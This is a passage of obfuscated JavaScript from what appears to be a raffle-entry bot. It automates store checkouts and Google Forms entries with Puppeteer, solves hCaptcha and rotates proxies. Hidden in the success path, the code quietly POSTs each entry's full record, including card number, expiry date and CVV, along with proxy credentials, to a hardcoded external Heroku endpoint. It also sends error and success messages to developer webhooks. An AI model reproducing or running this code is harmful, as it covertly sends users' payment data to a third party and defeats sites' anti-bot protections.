                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x23d254 = await _0x360355['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x3bb7c1 = Math['round'](Math['random']() * (_0x23d254['length'] - 0x1));
                            await _0x23d254[_0x3bb7c1]['click']();
                        }
                        await _0x73bf2c(0x4b0);
                        const _0x1a1f71 = await _0x360355['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x1a1f71[0x0]['click'](), await _0x360355['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x360355['type']('input[name=\x22email\x22]', '' + _0x2342b6[_0xb7b0a5]['Email']), await _0x73bf2c(0x640), await _0x360355['type']('input[name=\x22phone\x22]', '' + _0x2342b6[_0xb7b0a5]['Phone']), await _0x73bf2c(0x4b0), await _0x360355['click']('button.btn.continue-button__1RtsS'), await _0x73bf2c(0x4b0);
                        try {
                            await _0x360355['type']('input[name=\x22firstName\x22]', '' + _0x2342b6[_0xb7b0a5]['FirstName']), await _0x73bf2c(0x258);
                        } catch {
                            const _0x2f9275 = await _0x360355['$$eval']('.invalid-feedback\x20>\x20div', _0x461175 => {
                                return _0x461175['map'](_0x30a441 => _0x30a441['innerText']);
                            });
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20' + _0x2f9275));
                            continue;
                        }
                        await _0x360355['type']('input[name=\x22lastName\x22]', '' + _0x2342b6[_0xb7b0a5]['LastName']), await _0x73bf2c(0xc8), await _0x360355['type']('input[name=\x22instagramUsername\x22]', '' + _0x2342b6[_0xb7b0a5]['Follower']), await _0x73bf2c(0x4b0), await _0x360355['click']('button.btn.continue-button__1RtsS'), await _0x73bf2c(0x3e8), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x360355['select']('select[name=\x22country\x22]', '' + _0x2342b6[_0xb7b0a5]['Country']), await _0x73bf2c(0x2bc), await _0x360355['type']('input[name=\x22streetName\x22]', '' + _0x2342b6[_0xb7b0a5]['Address1']), await _0x73bf2c(0x258), await _0x360355['type']('input[name=\x22houseNumber\x22]', _0x2342b6[_0xb7b0a5]['HouseNumber'] + '\x20' + _0x2342b6[_0xb7b0a5]['Address2']), await _0x73bf2c(0xc8), await _0x360355['type']('input[name=\x22postalCode\x22]', '' + _0x2342b6[_0xb7b0a5]['Zip']), await _0x73bf2c(0x1f4), await _0x360355['type']('input[name=\x22city\x22]', '' + _0x2342b6[_0xb7b0a5]['City']), await _0x73bf2c(0x4b0), await _0x360355['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x73bf2c(0x4b0), await _0x360355['click']('button.btn.continue-button__1RtsS'), await _0x73bf2c(0x4b0), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x360355['solveRecaptchas'](), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x73bf2c(0xbb8), await _0x360355['click']('button.btn.continue-button__1RtsS'), await _0x73bf2c(0x1388), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x360355['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x360355['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x73bf2c(0x4b0), await _0x360355['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2342b6[_0xb7b0a5]['CardNumber']), await _0x73bf2c(0x320), await _0x360355['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x360355['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2342b6[_0xb7b0a5]['ExpiryDate']), await _0x73bf2c(0x4b0), await _0x360355['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x360355['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2342b6[_0xb7b0a5]['CVV']), await _0x73bf2c(0x226), await _0x360355['type']('input[name=\x22holderName\x22]', '' + _0x2342b6[_0xb7b0a5]['NameOnCard']), await _0x73bf2c(0x226), await _0x360355['click']('button.adyen-checkout__button'), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x360355['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x73bf2c(0xbb8);
                        } catch (_0x4efaac) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x203DS\x20Failed')), _0x15c4cf = '3DS\x20Error\x20' + _0x4efaac;
                            var _0x2c4655 = await _0x1bd114(_0x2342b6[_0xb7b0a5], _0x1eccb8, 'dev', !![], _0x15c4cf);
                            _0x2e9134['errorDEV'] = { 'embeds': [_0x2c4655] };
                            _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x2e9134['errorDEV']);
                            await _0x5cd94d(_0xfda3c6, _0x2e9134['errorDEV']);
                            continue;
                        }
                        _0x5584d0(_0x2342b6[_0xb7b0a5], _0x1eccb8), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x148b5a = _0x2342b6[_0xb7b0a5];
                        try {
                            prxdata = {
                                'username': _0x5c7ae6['replace']('#', ''),
                                'module': _0x1eccb8['name'],
                                'entrydata': JSON['stringify'](_0x148b5a),
                                'proxy': '' + _0x50eda3[_0xb7b0a5]
                            };
                            var _0x55e0d5 = JSON['stringify'](prxdata);
                            let _0x1c3f51 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x55e0d5, _0x1c3f51);
                        } catch (_0xdcb319) {
                        }
                        if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                            try {
                                await _0x5cd94d(_0x1d78d4['webhook'], _0x2e9134['succesDEVMSG']);
                            } catch {
                            }
                        await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x2e9134['succesDEVMSG']), await _0x73bf2c(0xc8);
                        try {
                            await _0x5cd94d(_0x323e07, _0x2e9134['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x617bc9) {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20' + _0x617bc9), _0x15c4cf = '' + _0x617bc9;
                        var _0x2c4655 = await _0x1bd114(_0x2342b6[_0xb7b0a5], _0x1eccb8, 'dev', !![], _0x15c4cf);
                        _0x2e9134['errorDEV'] = { 'embeds': [_0x2c4655] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x2e9134['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x2e9134['errorDEV']), _0x2081ba = 'yes';
                    } finally {
                        _0x45b071['close']();
                        if (_0x2081ba == 'yes' && _0x4f9345 != 0x5) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4f9345 + '\x20/\x205)')), _0xb7b0a5 = _0xb7b0a5 - 0x1, _0x4f9345 = _0x4f9345 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x4df6e0, _0x1f8349, _0x4cc6c1) {
                let _0x4cf3c8 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0xa7f064 = _0x57b36f['readFileSync']('forms/templates.json', 'utf-8');
                let _0x39c579 = JSON['parse'](_0xa7f064), _0x30c5a9 = ![];
                if (_0x39c579['length'] != 0x0) {
                    let _0x3a3a19 = 0x0;
                    for (template of _0x39c579) {
                        if (template['Url'] == _0x1f8349[0x0]['Url']) {
                            _0x30c5a9 = !![], console['log'](_0x11085b['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x11085b['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x11085b['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x37b0b3() {
                                let _0x9d08c5 = await _0x240076['get']('answer');
                                if (_0x9d08c5['answer']['toLowerCase']() != 'y' && _0x9d08c5['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x37b0b3();
                                return _0x9d08c5['answer']['toLowerCase']();
                            }
                            if (await _0x37b0b3() == 'n') {
                                _0x39c579['splice'](_0x3a3a19, 0x1), console['clear']();
                                break;
                            }
                            _0x4cf3c8 = template, console['clear']();
                            break;
                        }
                        _0x3a3a19++;
                    }
                }
                let _0x469193 = 0x0, _0x46f821 = 0x0;
                function _0x4262e3(_0x2040cf) {
                    console['log'](_0x4ea3c7() + '\x20[' + _0x4df6e0['name'] + ']\x20Task\x20' + (_0x52adf2 + 0x1) + '\x20:\x20' + _0x2040cf);
                }
                var _0x58e551 = 0x0;
                for (key in _0x4cf3c8) {
                    if (key['includes']('custom'))
                        _0x469193++;
                    if (key['includes']('Select'))
                        _0x46f821++;
                }
                for (var _0x52adf2 = 0x0; _0x52adf2 < _0x1f8349['length']; _0x52adf2++) {
                    _0x4cf3c8['Url'] = _0x1f8349[_0x52adf2]['Url'];
                    let _0x1cec56 = ![];
                    if (_0x39c579['length'] != 0x0)
                        for (template of _0x39c579) {
                            if (template['Url'] == _0x1f8349[_0x52adf2]['Url']) {
                                _0x4cf3c8 = template, _0x1cec56 = !![], _0x4262e3('Found\x20Template');
                                break;
                            }
                        }
                    var _0x4e9897;
                    if (_0xd915e8 != 'yes') {
                        if (!_0xd915e8)
                            var _0xd915e8 = '';
                        else
                            _0xd915e8 = '';
                        _0x58e551 = 0x0;
                    }
                    try {
                        await _0x4b6344(_0x1f8349, _0x52adf2);
                    } catch {
                        _0xd915e8 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x1d78d4['useRandomProxy'] = ![])
                        var _0x4408b9 = _0x4cc6c1[_0x52adf2]['split'](':');
                    else
                        var _0x380197 = Math['round'](Math['random']() * (_0x4cc6c1['length'] - 0x1)), _0x4408b9 = _0x4cc6c1[_0x380197]['split'](':');
                    var _0x35779d;
                    if (_0x4408b9['length'] == 0x1)
                        try {
                            _0x35779d = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x35779d = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x35779d = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4408b9[0x0] + ':' + _0x4408b9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x35779d = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4408b9[0x0] + ':' + _0x4408b9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x2517e6 = { 'first': ![] };
                        const _0x51aeab = await _0x35779d['newPage']();
                        if (_0x4408b9['length'] != 0x0)
                            await _0x51aeab['authenticate']({
                                'username': '' + _0x4408b9[0x2],
                                'password': '' + _0x4408b9[0x3]
                            });
                        _0x4262e3('Getting\x20Session');
                        let _0x4ceb2e = ![];
                        try {
                            await _0x51aeab['goto'](_0x1f8349[_0x52adf2]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x73bf2c(0xbb8);
                        } catch (_0x5645f9) {
                            throw new Error(_0x5645f9);
                        }
                        const _0x7a1f49 = await _0x51aeab['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x7a1f49) {
                            _0x4262e3('Login\x20Detected');
                            let _0xe04d66 = await _0x7a1f49['$']('div[data-id=\x22EBS5u\x22]');
                            await _0xe04d66['click'](), _0x4ceb2e = !![];
                        }
                        let _0x5cf6d7 = await _0x51aeab['$']('#identifierId');
                        _0x5cf6d7 && (_0x4ceb2e = !![]);
                        await _0x51aeab['waitForSelector']('.teQAzf');
                        async function _0x45b3d0() {
                            let _0x47319d = await _0x51aeab['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x47319d) {
                                let _0x353561;
                                try {
                                    _0x353561 = await question['$eval']('.M7eMe', _0xa7c6c => _0xa7c6c['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x469193 != 0x0) {
                                    let _0x12bf40 = ![];
                                    for (let _0x178747 = 0x0; _0x178747 < _0x469193; _0x178747++) {
                                        if (_0x353561 == _0x4cf3c8['custom' + _0x178747]['title']) {
                                            _0x4262e3('Custom\x20Selector\x20found;\x20' + _0x353561);
                                            let _0x5866c6 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x351503 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x5866c6)
                                                await _0x5866c6['type']('' + _0x4cf3c8['custom' + _0x178747]['answer']);
                                            else
                                                _0x351503 && await _0x351503['type']('' + _0x4cf3c8['custom' + _0x178747]['answer']);
                                            _0x12bf40 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x12bf40) {
                                        await _0x73bf2c(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x46f821 != 0x0) {
                                    let _0x5935d1 = ![];
                                    for (let _0x1289e5 = 0x0; _0x1289e5 < _0x46f821; _0x1289e5++) {
                                        if (_0x353561 == _0x4cf3c8[_0x1289e5 + 'Select']['title']) {
                                            _0x4262e3('Custom\x20Selector\x20found;\x20' + _0x353561);
                                            let _0x4ed500 = await question['$$']('.ulDsOb');
                                            for (opt of _0x4cf3c8[_0x1289e5 + 'Select']['answer']) {
                                                let _0x172310 = await _0x4ed500[opt]['$']('span');
                                                await _0x172310['click']();
                                            }
                                            _0x5935d1 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x5935d1) {
                                        await _0x73bf2c(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x353561 == _0x4cf3c8['0Select']['title']) {
                                        _0x4262e3('Custom\x20Selector\x20found;\x20' + _0x4cf3c8['0Select']['title']);
                                        let _0x1639d3 = await question['$$']('.ulDsOb'), _0x3a8ddc = await _0x1639d3[_0x4cf3c8['0Select']['answer']];
                                        await _0x3a8ddc['click']();
                                        continue;
                                    }
                                    if (_0x353561 == _0x4cf3c8['1Select']['title']) {
                                        _0x4262e3('Custom\x20Selector\x20found;\x20' + _0x4cf3c8['1Select']['title']);
                                        let _0x590594 = await question['$$']('.ulDsOb'), _0x402ea8 = await _0x590594[_0x4cf3c8['1Select']['answer']];
                                        await _0x402ea8['click']();
                                        continue;
                                    }
                                    if (_0x353561 == _0x4cf3c8['2Select']['title']) {
                                        _0x4262e3('Custom\x20Selector\x20found;\x20' + _0x4cf3c8['2Select']['title']);
                                        let _0x4bc500 = await question['$$']('.ulDsOb'), _0x7e96a5 = await _0x4bc500[_0x4cf3c8['2Select']['answer']];
                                        await _0x7e96a5['click']();
                                        continue;
                                    }
                                } catch (_0x394ef2) {
                                }
                                if (_0x353561['toLowerCase']()['includes']('mail') && !_0x353561['toLowerCase']()['includes']('agree') || _0x353561 == _0x4cf3c8['Email']) {
                                    _0x4262e3('Mail\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x8898c5 = await question['$']('input');
                                    !_0x8898c5 && (_0x8898c5 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x8898c5['type'](_0x1f8349[_0x52adf2]['Email']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('first') || _0x353561['toLowerCase']() == 'name' || _0x353561['toLowerCase']() == 'name\x20' || _0x353561 == _0x4cf3c8['FirstName']) {
                                    _0x4262e3('FirstName\x20Selector\x20found;\x20' + _0x353561);
                                    let _0xa2ff0b = await question['$']('input');
                                    !_0xa2ff0b && (_0xa2ff0b = await question['$']('textarea'));
                                    await _0xa2ff0b['type'](_0x1f8349[_0x52adf2]['FirstName'] + '\x20'), await _0x73bf2c(0x258);
                                    if (_0x353561 == _0x4cf3c8['FirstName'])
                                        continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('last') || _0x353561['toLowerCase']()['includes']('surname') || _0x353561 == _0x4cf3c8['LastName']) {
                                    _0x4262e3('LastName\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x3cadd5 = await question['$']('input');
                                    !_0x3cadd5 && (_0x3cadd5 = await question['$']('textarea'));
                                    await _0x3cadd5['type'](_0x1f8349[_0x52adf2]['LastName'] + '\x20'), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('address') && !_0x353561['toLowerCase']()['includes']('agree') || _0x353561 == _0x4cf3c8['Address']) {
                                    _0x4262e3('Address\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x499195 = await question['$']('input');
                                    !_0x499195 && (_0x499195 = await question['$']('textarea'));
                                    await _0x499195['type'](_0x1f8349[_0x52adf2]['Address1'] + '\x20' + _0x1f8349[_0x52adf2]['HouseNumber'] + '\x20' + _0x1f8349[_0x52adf2]['Address2']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('phone') || _0x353561['toLowerCase']()['includes']('mobile') || _0x353561 == _0x4cf3c8['Phone']) {
                                    _0x4262e3('Phone\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x3a49e3 = await question['$']('input');
                                    !_0x3a49e3 && (_0x3a49e3 = await question['$']('textarea'));
                                    await _0x3a49e3['type']('' + _0x1f8349[_0x52adf2]['Phone']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('country') || _0x353561 == _0x4cf3c8['Country']) {
                                    let _0x5b42e9 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x5b42e9) {
                                        let _0x2af494 = ![], _0x57db5f = await _0x5b42e9['$$']('.ulDsOb');
                                        for (option of _0x57db5f) {
                                            let _0x4facdd = await option['$']('span'), _0x293828 = await option['$eval']('span', _0x56b1ac => _0x56b1ac['textContent']);
                                            if (_0x293828['toLowerCase']() == _0x1f8349[_0x52adf2]['Country']['toLowerCase']()) {
                                                await _0x4facdd['click'](), _0x2af494 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x2af494) {
                                            const _0x1ee60a = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x1ee60a['click'](), await _0x1ee60a['type'](_0x1f8349[_0x52adf2]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x4262e3('Country\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x11acce = await question['$']('input');
                                    !_0x11acce && (_0x11acce = await question['$']('textarea'));
                                    await _0x11acce['type']('' + _0x1f8349[_0x52adf2]['Country']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('city') || _0x353561 == _0x4cf3c8['City']) {
                                    _0x4262e3('City\x20Selector\x20found;\x20' + _0x353561);
                                    let _0xfe9aa4 = await question['$']('input');
                                    !_0xfe9aa4 && (_0xfe9aa4 = await question['$']('textarea'));
                                    await _0xfe9aa4['type']('' + _0x1f8349[_0x52adf2]['City']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('zip') || _0x353561 == _0x4cf3c8['Zip']) {
                                    _0x4262e3('Zip\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x217f69 = await question['$']('input');
                                    !_0x217f69 && (_0x217f69 = await question['$']('textarea'));
                                    await _0x217f69['type']('' + _0x1f8349[_0x52adf2]['Zip']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('insta') || _0x353561 == _0x4cf3c8['Follower']) {
                                    _0x4262e3('Follower\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x57783e = await question['$']('input');
                                    !_0x57783e && (_0x57783e = await question['$']('textarea'));
                                    await _0x57783e['type']('' + _0x1f8349[_0x52adf2]['Follower']), await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('size') || _0x353561 == _0x4cf3c8['Size']) {
                                    _0x4262e3('Size\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x541149 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x541149) {
                                        let _0x5d61ad = await _0x541149['$$']('.ulDsOb');
                                        if (_0x1f8349[_0x52adf2]['Size']['toLowerCase']() == 'random') {
                                            var _0x58a278 = Math['round'](Math['random']() * (_0x5d61ad['length'] - 0x1));
                                            await _0x5d61ad[_0x58a278]['click']();
                                        } else
                                            for (size of _0x5d61ad) {
                                                let _0x325235 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x6a8524 => _0x6a8524['textContent']);
                                                if (_0x325235['toLowerCase']()['includes'](_0x1f8349[_0x52adf2]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x2c8acf = await question['$']('.ry3kXd');
                                    if (_0x2c8acf) {
                                        await _0x2c8acf['click'](), await _0x73bf2c(0x9c4);
                                        let _0x3141e8 = await _0x51aeab['$']('div[jsname=\x22V68bde\x22]'), _0x397d1e = await _0x3141e8['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x397d1e) {
                                            let _0x52ac69 = await size['$eval']('.vRMGwf.oJeWuf', _0x36e9e4 => _0x36e9e4['textContent']), _0x2af291 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x52ac69['toLowerCase']()['includes'](_0x1f8349[_0x52adf2]['Size'])) {
                                                await _0x73bf2c(0x190), await _0x2af291['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('receive') || _0x353561['toLowerCase']()['includes']('method')) {
                                    _0x4262e3('Method\x20Selector\x20found;\x20' + _0x353561);
                                    let _0x21b1fa = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x21b1fa) {
                                        const _0x6c6f31 = await _0x21b1fa['$$']('.ulDsOb');
                                        for (size of _0x6c6f31) {
                                            let _0x254878 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3fecec => _0x3fecec['textContent']);
                                            if (_0x254878['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x73bf2c(0x258);
                                    continue;
                                }
                                if (_0x353561['toLowerCase']()['includes']('offers') || _0x353561['toLowerCase']()['includes']('agree')) {
                                    _0x4262e3('Authorization\x20Selector\x20found;\x20' + _0x353561);
                                    const _0x444bfe = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x444bfe) {
                                        const _0x48efae = await _0x444bfe['$$']('.ulDsOb');
                                        for (size of _0x48efae) {
                                            let _0x290d6b = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x44810b => _0x44810b['textContent']);
                                            if (_0x290d6b['toLowerCase']()['includes']('authorize') || _0x290d6b['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x73bf2c(0x258);
                                    continue;
                                }
                                async function _0x58657b() {
                                    let _0x2cb182 = await question['$']('.oyXaNc');
                                    if (_0x2cb182) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x11085b['cyan'](_0x353561) + '\x0a');
                                        let _0x5bfa5f = await question['$$']('.ulDsOb');
                                        for (let _0x40740a = 0x0; _0x40740a < _0x5bfa5f['length']; _0x40740a++) {
                                            let _0xda85bc = await _0x5bfa5f[_0x40740a]['$eval']('span', _0x2f9eda => _0x2f9eda['textContent']);
                                            console['log']('\x20(' + _0x40740a + ')\x20' + _0xda85bc);
                                        }
                                        console['log']();
                                        let _0x3025e9 = await _0x240076['get']('option'), _0xa4a37b = await _0x5bfa5f[_0x3025e9['option']]['$eval']('span', _0x3820eb => _0x3820eb['textContent']);
                                        _0x4cf3c8[_0x46f821 + 'Select'] = {
                                            'title': _0x353561,
                                            'answer': _0x3025e9['option']['split'](',')
                                        };
                                        let _0x5ce969 = await _0x5bfa5f[_0x3025e9['option']]['$']('span');
                                        await _0x5ce969['click'](), _0x46f821++;
                                        return;
                                    }
                                    let _0x5ad135 = await question['$']('.Y6Myld');
                                    if (_0x5ad135) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x11085b['cyan'](_0x353561) + '\x0a');
                                        let _0x3a41b6 = await question['$$']('.ulDsOb');
                                        for (let _0x5560dd = 0x0; _0x5560dd < _0x3a41b6['length']; _0x5560dd++) {
                                            let _0x194874 = await _0x3a41b6[_0x5560dd]['$eval']('span', _0x230e88 => _0x230e88['textContent']);
                                            console['log']('\x20(' + _0x5560dd + ')\x20' + _0x194874);
                                        }
                                        console['log']();
                                        let _0x331ad8 = await _0x240076['get']('option');
                                        _0x4cf3c8[_0x46f821 + 'Select'] = {
                                            'title': _0x353561,
                                            'answer': _0x331ad8['option']['split'](',')
                                        };
                                        for (opt of _0x4cf3c8[_0x46f821 + 'Select']['answer']) {
                                            let _0x37c2e6 = await _0x3a41b6[opt]['$']('span');
                                            await _0x37c2e6['click']();
                                        }
                                        _0x46f821++;
                                        return;
                                    }
                                    var _0x5901b4 = 0x0;
                                    let _0x1166a3 = Object['keys'](_0x4cf3c8);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x11085b['cyan'](_0x353561) + '\x0a');
                                    for (data of _0x1166a3) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x5901b4 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x5901b4 + ')\x20' + data), _0x5901b4++;
                                    }
                                    console['log']('\x20(' + _0x1166a3['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x44232d = await _0x240076['get']('input');
                                    if (_0x44232d['input'] == _0x1166a3['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x5e152d = await _0x240076['get']('input');
                                        _0x4cf3c8['custom' + _0x469193] = {
                                            'title': _0x353561,
                                            'answer': '' + _0x5e152d['input']
                                        };
                                        let _0x516212 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x12fa93 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x516212)
                                            await _0x516212['type']('' + _0x4cf3c8['custom' + _0x469193]['answer']);
                                        else
                                            _0x12fa93 && await _0x12fa93['type']('' + _0x4cf3c8['custom' + _0x469193]['answer']);
                                        _0x469193++;
                                        return;
                                    }
                                    _0x4cf3c8['' + _0x1166a3[_0x44232d['input']]] = _0x353561;
                                    let _0x1f7031 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x5b4e7c = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
